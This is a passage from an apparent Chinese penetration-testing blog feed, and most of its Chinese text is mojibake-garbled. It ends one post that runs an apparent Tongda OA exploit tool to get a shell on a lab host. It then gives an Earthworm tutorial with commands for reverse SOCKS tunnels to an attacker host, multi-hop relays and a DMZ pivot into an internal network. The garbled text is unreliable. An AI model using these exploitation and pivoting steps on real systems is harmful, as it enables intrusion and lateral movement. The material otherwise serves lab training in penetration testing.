href="#å¤§æˆ˜bugï¼š" class="headerlink" title="å¤§æˆ˜bugï¼š"></a>å¤§æˆ˜bugï¼š</h4><p>ä¸€å¼€å§‹goçš„ç‰ˆæœ¬æ¯”è¾ƒä½ï¼š</p><p>go version go1.16.2 darwin/amd64</p><p>å‡ºç°äº†å¦‚ä¸‹çš„é—®é¢˜ï¼š</p><img src="/2025/01/17/gong-fang-gong-ju-ku/tong-da-oa-lou-dong-tan-ce-ji-li-yong/%E6%88%AA%E5%B1%8F2025-01-17%2010.00.21.png" style="zoom:50%;"><p>åˆ†ææ˜¯å› ä¸ºç‰ˆæœ¬çš„é—®é¢˜ï¼Œä¸æ”¯æŒ //go:buildæ³¨é‡Šã€‚</p><p>æ¥ä¸‹æ¥åšç‰ˆæœ¬å‡çº§ã€‚</p><h4 id="å¦‚ä½•ç¡®å®šmacbookä¸­çš„golangæ˜¯é€šè¿‡brew-installï¼Œè¿˜æ˜¯-pkgå®‰è£…çš„"><a href="#å¦‚ä½•ç¡®å®šmacbookä¸­çš„golangæ˜¯é€šè¿‡brew-installï¼Œè¿˜æ˜¯-pkgå®‰è£…çš„" class="headerlink" title="å¦‚ä½•ç¡®å®šmacbookä¸­çš„golangæ˜¯é€šè¿‡brew installï¼Œè¿˜æ˜¯.pkgå®‰è£…çš„:"></a>å¦‚ä½•ç¡®å®šmacbookä¸­çš„golangæ˜¯é€šè¿‡brew installï¼Œè¿˜æ˜¯.pkgå®‰è£…çš„:</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">% <span class="token function">which</span> go/usr/local/go/bin/go<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œè¾“å…¥which goï¼Œè¿”å›äº†è·¯å¾„ï¼Œå¦‚æœæ˜¯è¿™ä¸ªè·¯å¾„å¯ä»¥è¯´æ˜æ˜¯é€šè¿‡.pkgå®‰è£…çš„ã€‚</p><p>ä¹Ÿå¯ä»¥è¾“å…¥ brew info goï¼Œå¯ä»¥çœ‹åˆ°è¿”å›çš„ä¿¡æ¯ä¸­ç¬¬å››è¡Œ Not installedçš„è¿”å›ï¼Œè¯´æ˜äº†æ²¡æœ‰ç”¨brew install å®‰è£…è¿‡ï¼Œå¦‚æœæ˜¯ç”¨brew install go å®‰è£…çš„goè¯­è¨€ï¼Œä¼šè¿”å›å¦‚ä¸‹å†…å®¹ï¼Œå†…å®¹çš„ç¬¬å››è¡Œå†™äº†å®‰è£…çš„è·¯å¾„</p><img src="/2025/01/17/gong-fang-gong-ju-ku/tong-da-oa-lou-dong-tan-ce-ji-li-yong/%E6%88%AA%E5%B1%8F2025-01-17%2010.04.54.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">go: stable <span class="token number">1.17</span>.1 <span class="token punctuation">(</span>bottled<span class="token punctuation">)</span>, HEADGo programming language compilerhttps://golang.org/usr/local/Cellar/go/1.17.1 <span class="token punctuation">(</span><span class="token number">9,103</span> files, <span class="token number">512</span>.4MB<span class="token punctuation">)</span> *<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœæ˜¯é€šè¿‡brew install go å®‰è£…çš„goè¯­è¨€ï¼Œé‚£ä¹ˆåªéœ€è¦æ‰§è¡Œä¸‹é¢è¿™è¡Œå‘½ä»¤ï¼Œå³å¯å®Œæˆå‡çº§</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">brew upgrade go<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç»è¿‡ä¸Šè¿°æ­¥éª¤å¯ä»¥ç¡®å®šæˆ‘å½“æ—¶æ˜¯ç”¨pkgåŒ…å®‰è£…çš„ï¼š</p><p>åˆ é™¤æ—§ç‰ˆæœ¬ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> /usr/local/go<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/17/gong-fang-gong-ju-ku/tong-da-oa-lou-dong-tan-ce-ji-li-yong/%E6%88%AA%E5%B1%8F2025-01-17%2010.07.01.png" style="zoom:50%;"><p>ä¸‹è½½æ–°ç‰ˆæœ¬ï¼šå‰å¾€ Go å®˜æ–¹ç½‘ç«™ï¼ˆ<a href="https://golang.org/dl/%EF%BC%89%E4%B8%8B%E8%BD%BD%E6%9C%80%E6%96%B0%E7%9A%84">https://golang.org/dl/ï¼‰ä¸‹è½½æœ€æ–°çš„</a> Go è¯­è¨€ç‰ˆæœ¬çš„ macOS <a href="https://so.csdn.net/so/search?q=%E5%AE%89%E8%A3%85%E5%8C%85&amp;spm=1001.2101.3001.7020">å®‰è£…åŒ…</a>ï¼ˆé€šå¸¸æ˜¯ä¸€ä¸ª .pkg æ–‡ä»¶ï¼‰</p><img src="/2025/01/17/gong-fang-gong-ju-ku/tong-da-oa-lou-dong-tan-ce-ji-li-yong/%E6%88%AA%E5%B1%8F2025-01-17%2010.08.21.png" style="zoom:50%;"><p>å®‰è£…æ–°ç‰ˆæœ¬ï¼šåŒå‡»ä¸‹è½½çš„ .pkg æ–‡ä»¶ï¼ŒæŒ‰ç…§å®‰è£…å‘å¯¼è¿›è¡Œå®‰è£…ã€‚è¿™å°†åœ¨ <code>/usr/local/go</code> ç›®å½•ä¸‹å®‰è£…æ–°çš„ Go è¯­è¨€ç‰ˆæœ¬ã€‚</p><img src="/2025/01/17/gong-fang-gong-ju-ku/tong-da-oa-lou-dong-tan-ce-ji-li-yong/%E6%88%AA%E5%B1%8F2025-01-17%2010.10.56.png" style="zoom:50%;"><p>é‡æ–°æ‰§è¡Œï¼š</p><img src="/2025/01/17/gong-fang-gong-ju-ku/tong-da-oa-lou-dong-tan-ce-ji-li-yong/%E6%88%AA%E5%B1%8F2025-01-17%2010.11.53.png" style="zoom:50%;"><p>å°è¯•å‡çº§quic-goçš„ç‰ˆæœ¬ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">go get <span class="token parameter variable">-u</span> github.com/quic-go/guic-go<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/17/gong-fang-gong-ju-ku/tong-da-oa-lou-dong-tan-ce-ji-li-yong/%E6%88%AA%E5%B1%8F2025-01-17%2010.16.15.png" style="zoom:40%;"><p>å‡çº§<code>imroc/req/v3</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">go get <span class="token parameter variable">-u</span> github.com/imroc/req/v3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">go run main.go<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆåŠŸæ‰§è¡Œï¼š</p><img src="/2025/01/17/gong-fang-gong-ju-ku/tong-da-oa-lou-dong-tan-ce-ji-li-yong/%E6%88%AA%E5%B1%8F2025-01-17%2010.18.49.png" style="zoom:50%;"><h3 id="3-3-2-æ¼æ´æ‰«æ"><a href="#3-3-2-æ¼æ´æ‰«æ" class="headerlink" title="3.3.2 æ¼æ´æ‰«æ"></a>3.3.2 æ¼æ´æ‰«æ</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">go run main.go scan <span class="token parameter variable">-u</span> http://192.168.52.30:8080/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/17/gong-fang-gong-ju-ku/tong-da-oa-lou-dong-tan-ce-ji-li-yong/%E6%88%AA%E5%B1%8F2025-01-17%2010.25.59.png" style="zoom:50%;"><h3 id="3-3-3-æ¼æ´åˆ©ç”¨"><a href="#3-3-3-æ¼æ´åˆ©ç”¨" class="headerlink" title="3.3.3 æ¼æ´åˆ©ç”¨"></a>3.3.3 æ¼æ´åˆ©ç”¨</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">go run main.go exp <span class="token parameter variable">-u</span> http://192.168.52.30:8080/ <span class="token parameter variable">-i</span> Td03<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/17/gong-fang-gong-ju-ku/tong-da-oa-lou-dong-tan-ce-ji-li-yong/%E6%88%AA%E5%B1%8F2025-01-17%2010.28.33.png" style="zoom:50%;"><img src="/2025/01/17/gong-fang-gong-ju-ku/tong-da-oa-lou-dong-tan-ce-ji-li-yong/%E6%88%AA%E5%B1%8F2025-01-17%2010.52.50.png" style="zoom:50%;"><img src="/2025/01/17/gong-fang-gong-ju-ku/tong-da-oa-lou-dong-tan-ce-ji-li-yong/%E6%88%AA%E5%B1%8F2025-01-17%2010.53.31.png" style="zoom:50%;"><p>æˆåŠŸgetshell!</p>]]></content>
      
      
      <categories>
          
          <category> æ”»é˜²å·¥å…·åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ”»é˜²å·¥å…·åº“ </tag>
            
            <tag> OAç³»ç»Ÿæ¼æ´åˆ©ç”¨ </tag>
            
            <tag> é€šè¾¾OA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Earthworm-éš§é“æ­å»º</title>
      <link href="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/"/>
      <url>/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€Earthwormç®€ä»‹"><a href="#ä¸€ã€Earthwormç®€ä»‹" class="headerlink" title="ä¸€ã€Earthwormç®€ä»‹"></a>ä¸€ã€Earthwormç®€ä»‹</h1><p>Earthwormï¼ˆç®€ç§°EWï¼‰æ˜¯ä¸€æ¬¾è½»é‡ä¾¿æºä¸”åŠŸèƒ½å¼ºå¤§çš„ç½‘ç»œç©¿é€å·¥å…·ï¼ŒåŸºäºæ ‡å‡†Cå¼€å‘ã€‚å®ƒå…·æœ‰SOCKS v5æœåŠ¡æ¶è®¾å’Œç«¯å£è½¬å‘ä¸¤å¤§æ ¸å¿ƒåŠŸèƒ½ï¼Œå¯ä»¥åœ¨å¤æ‚ç½‘ç»œç¯å¢ƒä¸‹å®Œæˆç½‘ç»œç©¿é€ã€‚Earthwormèƒ½å¤Ÿä»¥â€œæ­£å‘â€ã€â€œåå‘â€ã€â€œå¤šçº§çº§è”â€ç­‰æ–¹å¼æ‰“é€šä¸€æ¡ç½‘ç»œéš§é“ï¼Œç›´è¾¾ç½‘ç»œæ·±å¤„ã€‚è¯¥å·¥å…·æ”¯æŒå¤šå¹³å°é—´çš„è½¬æ¥é€šè®¯ï¼ŒåŒ…æ‹¬Linuxã€Windowsã€MacOSã€Arm-Linuxç­‰æ“ä½œç³»ç»Ÿã€‚</p><p>Earthworm å·¥å…·åŒ…ä¸­æä¾›äº†å¤šç§å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä»¥é€‚åº”ä¸åŒçš„æ“ä½œç³»ç»Ÿã€‚å®ƒæ”¯æŒå…¨å¹³å°(Windows/Linux/Mac)ï¼Œä¸”èƒ½å¤Ÿç©¿é€å¤æ‚çš„å†…ç½‘ç¯å¢ƒï¼ŒåŒæ—¶ä¹Ÿä¸éœ€è¦è·³æ¿æœºè¿è¡ŒwebæœåŠ¡ã€‚</p><p>Earthworm æœ‰å…­ç§æ¨¡å¼ï¼Œåˆ†åˆ«æ˜¯ï¼šssocksdã€rcsocksã€rssocksã€lcx_slaveã€lcx_listenã€lcx_tranï¼Œè¿™äº›æ¨¡å¼åˆ†åˆ«å¯¹åº”ä¸åŒçš„ç½‘ç»œç©¿é€åœºæ™¯å’Œéœ€æ±‚ã€‚</p><p>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p><p>ä¸»é¡µåœ°å€ï¼š<a href="https://rootkiter.com/EarthWorm/">https://rootkiter.com/EarthWorm/</a></p><h1 id="äºŒã€ä½¿ç”¨æ–¹æ³•"><a href="#äºŒã€ä½¿ç”¨æ–¹æ³•" class="headerlink" title="äºŒã€ä½¿ç”¨æ–¹æ³•"></a>äºŒã€ä½¿ç”¨æ–¹æ³•</h1><h2 id="2-1-æ™®é€šç½‘ç»œç¯å¢ƒ"><a href="#2-1-æ™®é€šç½‘ç»œç¯å¢ƒ" class="headerlink" title="2.1  æ™®é€šç½‘ç»œç¯å¢ƒ"></a>2.1  æ™®é€šç½‘ç»œç¯å¢ƒ</h2><h3 id="2-1-1-ç›®æ ‡ç½‘ç»œè¾¹ç•Œå­˜åœ¨å…¬ç½‘IPä¸”å¯ä»»æ„å¼€ç›‘å¬ç«¯å£"><a href="#2-1-1-ç›®æ ‡ç½‘ç»œè¾¹ç•Œå­˜åœ¨å…¬ç½‘IPä¸”å¯ä»»æ„å¼€ç›‘å¬ç«¯å£" class="headerlink" title="2.1.1 ç›®æ ‡ç½‘ç»œè¾¹ç•Œå­˜åœ¨å…¬ç½‘IPä¸”å¯ä»»æ„å¼€ç›‘å¬ç«¯å£"></a>2.1.1 ç›®æ ‡ç½‘ç»œè¾¹ç•Œå­˜åœ¨å…¬ç½‘IPä¸”å¯ä»»æ„å¼€ç›‘å¬ç«¯å£</h3><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2013.30.13.png" style="zoom:40%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">a<span class="token punctuation">)</span>./ew <span class="token parameter variable">-s</span> ssocksd <span class="token parameter variable">-l</span> <span class="token number">8888</span> // åœ¨ <span class="token number">1.1</span>.1.1 ä¸»æœºä¸Šé€šè¿‡è¿™ä¸ªå‘½ä»¤å¼€å¯ <span class="token number">8888</span> ç«¯å£çš„ socks ä»£ç†b<span class="token punctuation">)</span> HackTools å¯é€šè¿‡è®¿é—® <span class="token number">1.1</span>.1.1:8888 ç«¯å£ä½¿ç”¨ <span class="token number">1.1</span>.1.1 ä¸»æœºæä¾›çš„ä»£ç†<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-1-2-ç›®æ ‡ç½‘ç»œè¾¹ç•Œä¸å­˜åœ¨å…¬ç½‘-IPï¼Œéœ€è¦é€šè¿‡åå¼¹æ–¹å¼åˆ›å»º-socks-ä»£ç†"><a href="#2-1-2-ç›®æ ‡ç½‘ç»œè¾¹ç•Œä¸å­˜åœ¨å…¬ç½‘-IPï¼Œéœ€è¦é€šè¿‡åå¼¹æ–¹å¼åˆ›å»º-socks-ä»£ç†" class="headerlink" title="2.1.2 ç›®æ ‡ç½‘ç»œè¾¹ç•Œä¸å­˜åœ¨å…¬ç½‘ IPï¼Œéœ€è¦é€šè¿‡åå¼¹æ–¹å¼åˆ›å»º socks ä»£ç†"></a>2.1.2 ç›®æ ‡ç½‘ç»œè¾¹ç•Œä¸å­˜åœ¨å…¬ç½‘ IPï¼Œéœ€è¦é€šè¿‡åå¼¹æ–¹å¼åˆ›å»º socks ä»£ç†</h3><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2013.33.38.png" style="zoom:40%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">a<span class="token punctuation">)</span> ./ew <span class="token parameter variable">-s</span> rcsocks <span class="token parameter variable">-l</span> <span class="token number">1080</span> <span class="token parameter variable">-e</span> <span class="token number">8888</span>// åœ¨ <span class="token number">1.1</span>.1.1 çš„å…¬ç½‘ä¸»æœºæ·»åŠ è½¬æ¥éš§é“ï¼Œå°† <span class="token number">1080</span> æ”¶åˆ°çš„ä»£ç†è¯·æ±‚è½¬äº¤ç»™åè¿ <span class="token number">8888</span> ç«¯å£çš„ä¸»æœºb<span class="token punctuation">)</span> ./ew <span class="token parameter variable">-s</span> rssocks <span class="token parameter variable">-d</span> <span class="token number">1.1</span>.1.1 <span class="token parameter variable">-e</span> <span class="token number">8888</span>          // å°†ç›®æ ‡ç½‘ç»œçš„å¯æ§è¾¹ç•Œä¸»æœºåå‘è¿æ¥å…¬ç½‘ä¸»æœºc<span class="token punctuation">)</span> HackTools å¯é€šè¿‡è®¿é—® <span class="token number">1.1</span>.1.1:1080 ç«¯å£ä½¿ç”¨ rssocks ä¸»æœºæä¾›çš„ socks5 ä»£ç†æœåŠ¡<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-2-äºŒé‡ç½‘ç»œç¯å¢ƒ"><a href="#2-2-äºŒé‡ç½‘ç»œç¯å¢ƒ" class="headerlink" title="2.2 äºŒé‡ç½‘ç»œç¯å¢ƒ"></a>2.2 äºŒé‡ç½‘ç»œç¯å¢ƒ</h2><h3 id="2-2-1-æƒ…å½¢1"><a href="#2-2-1-æƒ…å½¢1" class="headerlink" title="2.2.1 æƒ…å½¢1"></a>2.2.1 æƒ…å½¢1</h3><p>è·å¾—ç›®æ ‡ç½‘ç»œå†…ä¸¤å°ä¸»æœº Aã€B çš„æƒé™ï¼Œæƒ…å†µæè¿°å¦‚ä¸‹ï¼š</p><ul><li>A ä¸»æœºï¼š  å­˜åœ¨å…¬ç½‘ IPï¼Œä¸”è‡ªç”±ç›‘å¬ä»»æ„ç«¯å£ï¼Œæ— æ³•è®¿é—®ç‰¹å®šèµ„æº</li><li>B ä¸»æœºï¼š  ç›®æ ‡ç½‘ç»œå†…éƒ¨ä¸»æœºï¼Œå¯è®¿é—®ç‰¹å®šèµ„æºï¼Œä½†æ— æ³•è®¿é—®å…¬ç½‘</li><li>A ä¸»æœºå¯ç›´è¿ B ä¸»æœº</li></ul><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2013.41.25.png" style="zoom:50%;"><pre class="line-numbers language-none"><code class="language-none">a)  ./ew -s ssocksd -l 9999// åœ¨ 2.2.2.3 ä¸»æœºä¸Šåˆ©ç”¨ ssocksd æ–¹å¼å¯åŠ¨ 9999 ç«¯å£çš„ socks ä»£ç†b)  ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999 // å°† 1080 ç«¯å£æ”¶åˆ°çš„ socks ä»£ç†è¯·æ±‚è½¬äº¤ç»™ 2.2.2.3 çš„ä¸»æœºã€‚c)  HackTools å¯é€šè¿‡è®¿é—® 2.2.2.2:1080 æ¥ä½¿ç”¨ 2.2.2.3 ä¸»æœºæä¾›çš„ socks5 ä»£ç†ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-2-2-æƒ…å½¢2"><a href="#2-2-2-æƒ…å½¢2" class="headerlink" title="2.2.2 æƒ…å½¢2"></a>2.2.2 æƒ…å½¢2</h3><p>è·å¾—ç›®æ ‡ç½‘ç»œå†…ä¸¤å°ä¸»æœº Aã€B çš„æƒé™ï¼Œæƒ…å†µæè¿°å¦‚ä¸‹ï¼š</p><ul><li><p>A ä¸»æœºï¼š  ç›®æ ‡ç½‘ç»œçš„è¾¹ç•Œä¸»æœºï¼Œæ— å…¬ç½‘ IPï¼Œæ— æ³•è®¿é—®ç‰¹å®šèµ„æºã€‚</p></li><li><p>B ä¸»æœºï¼š  ç›®æ ‡ç½‘ç»œå†…éƒ¨ä¸»æœºï¼Œå¯è®¿é—®ç‰¹å®šèµ„æºï¼Œå´æ— æ³•å›è¿å…¬ç½‘ã€‚</p></li><li><p>A ä¸»æœºå¯ç›´è¿ B ä¸»æœº</p></li></ul><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2013.44.27.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">a<span class="token punctuation">)</span>  ./ew <span class="token parameter variable">-s</span> lcx_listen <span class="token parameter variable">-l</span> <span class="token number">1080</span> <span class="token parameter variable">-e</span> <span class="token number">8888</span>// åœ¨ <span class="token number">1.1</span>.1.1 å…¬ç½‘ä¸»æœºæ·»åŠ è½¬æ¥éš§é“ï¼Œå°† <span class="token number">1080</span> æ”¶åˆ°çš„ä»£ç†è¯·æ±‚è½¬äº¤ç»™åè¿ <span class="token number">8888</span> ç«¯å£çš„ä¸»æœºb<span class="token punctuation">)</span>  ./ew <span class="token parameter variable">-s</span> ssocksd <span class="token parameter variable">-l</span> <span class="token number">9999</span>// åœ¨ <span class="token number">2.2</span>.2.3 ä¸»æœºä¸Šåˆ©ç”¨ ssocksd æ–¹å¼å¯åŠ¨ <span class="token number">9999</span> ç«¯å£çš„ socks ä»£ç†c<span class="token punctuation">)</span>  ./ew <span class="token parameter variable">-s</span> lcx_slave <span class="token parameter variable">-d</span> <span class="token number">1.1</span>.1.1 <span class="token parameter variable">-e</span> <span class="token number">8888</span> <span class="token parameter variable">-f</span> <span class="token number">2.2</span>.2.3 <span class="token parameter variable">-g</span> <span class="token number">9999</span>// åœ¨ <span class="token number">2.2</span>.2.2 ä¸Šï¼Œé€šè¿‡å·¥å…·çš„ lcx_slave æ–¹å¼ï¼Œæ‰“é€š1.1.1.1:8888 å’Œ <span class="token number">2.2</span>.2.3:9999 ä¹‹é—´çš„é€šè®¯éš§é“d<span class="token punctuation">)</span>  HackTools å¯é€šè¿‡è®¿é—® <span class="token number">1.1</span>.1.1:1080 æ¥ä½¿ç”¨ <span class="token number">2.2</span>.2.3 ä¸»æœºæä¾›çš„ socks5 ä»£ç†<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-3-å‚æ•°è¯´æ˜"><a href="#2-3-å‚æ•°è¯´æ˜" class="headerlink" title="2.3 å‚æ•°è¯´æ˜"></a>2.3 å‚æ•°è¯´æ˜</h2><p>ç›®å‰å·¥å…·æä¾›å…­ç§é“¾è·¯çŠ¶æ€ï¼Œå¯é€šè¿‡ -s å‚æ•°è¿›è¡Œé€‰å®šï¼Œåˆ†åˆ«ä¸º:</p><ul><li>ssocksd   </li><li>rcsocks   </li><li>rssocks  </li><li>lcx_slave </li><li>lcx_tran  </li><li>lcx_listen</li></ul><p>å…¶ä¸­ SOCKS5 æœåŠ¡çš„æ ¸å¿ƒé€»è¾‘æ”¯æŒç”± ssocksd å’Œ rssocks æä¾›ï¼Œåˆ†åˆ«å¯¹åº”æ­£å‘ä¸åå‘socksä»£ç†ã€‚</p><p>å…¶ä½™çš„ lcx é“¾è·¯çŠ¶æ€ç”¨äºæ‰“é€šæµ‹è¯•ä¸»æœºåŒ socks æœåŠ¡å™¨ä¹‹é—´çš„é€šè·¯ã€‚</p><p>lcx ç±»åˆ«ç®¡é“ï¼š</p><ul><li>lcx_slave  è¯¥ç®¡é“ä¸€ä¾§é€šè¿‡åå¼¹æ–¹å¼è¿æ¥ä»£ç†è¯·æ±‚æ–¹ï¼Œå¦ä¸€ä¾§è¿æ¥ä»£ç†æä¾›ä¸»æœºã€‚</li><li>lcx_tran   è¯¥ç®¡é“ï¼Œé€šè¿‡ç›‘å¬æœ¬åœ°ç«¯å£æ¥æ”¶ä»£ç†è¯·æ±‚ï¼Œå¹¶è½¬äº¤ç»™ä»£ç†æä¾›ä¸»æœºã€‚</li><li>lcx_listen è¯¥ç®¡é“ï¼Œé€šè¿‡ç›‘å¬æœ¬åœ°ç«¯å£æ¥æ”¶æ•°æ®ï¼Œå¹¶å°†å…¶è½¬äº¤ç»™ç›®æ ‡ç½‘ç»œå›è¿çš„ä»£ç†æä¾›ä¸»æœºã€‚</li></ul><p>é€šè¿‡ç»„åˆlcxç±»åˆ«ç®¡é“çš„ç‰¹æ€§ï¼Œå¯ä»¥å®ç°å¤šå±‚å†…ç½‘ç¯å¢ƒä¸‹çš„æ¸—é€æµ‹è¯•ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¸‰çº§è·³çš„æœ¬åœ°æµ‹è¯•ä¾‹å­ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./ew <span class="token parameter variable">-s</span> rcsocks <span class="token parameter variable">-l</span> <span class="token number">1080</span> <span class="token parameter variable">-e</span> <span class="token number">8888</span>./ew <span class="token parameter variable">-s</span> lcx_slave <span class="token parameter variable">-d</span> <span class="token number">127.0</span>.0.1 <span class="token parameter variable">-e</span> <span class="token number">8888</span> <span class="token parameter variable">-f</span> <span class="token number">127.0</span>.0.1 <span class="token parameter variable">-g</span> <span class="token number">9999</span>./ew <span class="token parameter variable">-s</span> lcx_listen <span class="token parameter variable">-l</span> <span class="token number">9999</span> <span class="token parameter variable">-e</span> <span class="token number">7777</span>./ew <span class="token parameter variable">-s</span> rssocks <span class="token parameter variable">-d</span> <span class="token number">127.0</span>.0.1 <span class="token parameter variable">-e</span> <span class="token number">7777</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>   æ•°æ®æµå‘ä¸º   IE -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks </p><h2 id="2-4-rcsocks-å’Œ-rssocksçš„åŒºåˆ«"><a href="#2-4-rcsocks-å’Œ-rssocksçš„åŒºåˆ«" class="headerlink" title="2.4 rcsocks å’Œ rssocksçš„åŒºåˆ«"></a>2.4 rcsocks å’Œ rssocksçš„åŒºåˆ«</h2><ul><li><code>rcsocks</code> æ˜¯åå‘ socks ä»£ç†å®¢æˆ·ç«¯æ¨¡å¼ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œå®¢æˆ·ç«¯è®¾ç½®ç›‘å¬ç«¯å£ï¼Œå°†æ”¶åˆ°çš„ä»£ç†è¯·æ±‚è½¬äº¤ç»™åè¿çš„è¢«æ§æœåŠ¡å™¨ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥åœ¨ä»£ç†å®¢æˆ·ç«¯è®¾ç½®ç›‘å¬ç«¯å£ï¼Œå°†6666æ”¶åˆ°çš„ä»£ç†è¯·æ±‚è½¬äº¤ç»™åè¿8888ç«¯å£çš„è¢«æ§æœåŠ¡å™¨ã€‚</li><li><code>rssocks</code> æ˜¯åå‘ socks ä»£ç†æœåŠ¡ç«¯æ¨¡å¼ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œåˆ›å»ºåå‘ socks ä»£ç†æœåŠ¡ç«¯ï¼Œé€‚ç”¨äºç›®æ ‡æœºå™¨æ²¡æœ‰å…¬ç½‘ IPï¼Œä½†å¯è®¿é—®å†…ç½‘èµ„æºçš„åœºæ™¯ã€‚å®ƒå°†æœ¬æœºçš„ä»£ç†æµé‡åå‘ä»£ç†åˆ°æŒ‡å®šçš„ä¸»æœºå’Œç«¯å£ï¼Œä¾‹å¦‚åœ¨è¢«æ§ä¸»æœº2å¯åŠ¨SOCKS v5ä»£ç†æœåŠ¡ç«¯ï¼Œå¹¶åå¼¹åˆ°è¢«æ§ä¸»æœº1çš„9999ç«¯å£ã€‚</li></ul><h1 id="ä¸‰ã€å®æˆ˜"><a href="#ä¸‰ã€å®æˆ˜" class="headerlink" title="ä¸‰ã€å®æˆ˜"></a>ä¸‰ã€å®æˆ˜</h1><p>åœ¨å¯¹æŸä¸ªä¸‰å±‚ç½‘ç»œç¯å¢ƒçš„é¶åœºè¿›è¡Œæ¸—é€çš„è¿‡ç¨‹ä¸­ï¼Œå½“æ‹¿ä¸‹DMZåŒºå’ŒäºŒå±‚ç½‘ç»œå„ä¸€å°ä¸»æœºåï¼Œé€šè¿‡æ­å»ºéš§é“ï¼Œå»ºç«‹æ”»å‡»æœºå¯¹äºŒå±‚ç½‘ç»œä¸»æœºçš„è®¿é—®é€šé“ã€‚</p><p>ç½‘ç»œç¯å¢ƒå¤§è‡´å¦‚ä¸‹ï¼š</p><p>ã€æ”»å‡»æœº192.168.43.26ã€‘â€”â€”&gt;ã€DMZ 192.168.43.253ï½œ192.168.52.10)ã€‘â€”â€”&gt;ã€äºŒå±‚ 192.168.52.20ã€‘</p><p>è¿™é‡Œæ˜¯åœ¨æœ¬æœºæ­å»ºçš„ç¯å¢ƒï¼Œåœ¨å®é™…æ”»å‡»åœºæ™¯ä¸­æ”»å‡»æœºä¸€èˆ¬æ˜¯äº’è”ç½‘ä¸Šä¸€å°æ‹¥æœ‰å…¬ç½‘ipçš„VPSï¼ŒDMZå¯¹å¤–çš„IPä¹Ÿæ˜¯äº’è”ç½‘IPã€‚</p><p>éœ€æ±‚ï¼šå»ºç«‹æ”»å‡»æœºå’ŒäºŒå±‚ä¸»æœºçš„éš§é“ï¼Œå®ç°ç›´æ¥åœ¨æ”»å‡»æœºä¸­ä½¿ç”¨nmapå¯¹äºŒå±‚ç½‘ç»œä¸­çš„ä¸»æœºè¿›è¡Œæ‰«æã€‚</p><ul><li>æ”»å‡»æœºï¼š</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./ew_for_linux64 <span class="token parameter variable">-s</span> rcsocks <span class="token parameter variable">-l</span> <span class="token number">1080</span> <span class="token parameter variable">-e</span> <span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>å‘½ä»¤è¯¦è§£ï¼š</p><ul><li><code>-s rcsocks</code>ï¼šæŒ‡å®šä½¿ç”¨ <code>rcsocks</code> æ¨¡å¼ã€‚<code>rcsocks</code> æ¨¡å¼æ˜¯ Earthworm çš„ SOCKS ä»£ç†æ¨¡å¼ï¼Œå®ƒåˆ›å»ºä¸€ä¸ª SOCKS æœåŠ¡å™¨ï¼Œè¯¥æœåŠ¡å™¨æ¥æ”¶æ¥è‡ªå®¢æˆ·ç«¯çš„è¿æ¥ï¼Œå¹¶å°†è¿™äº›è¿æ¥è½¬å‘åˆ°è¿œç¨‹çš„ SOCKS 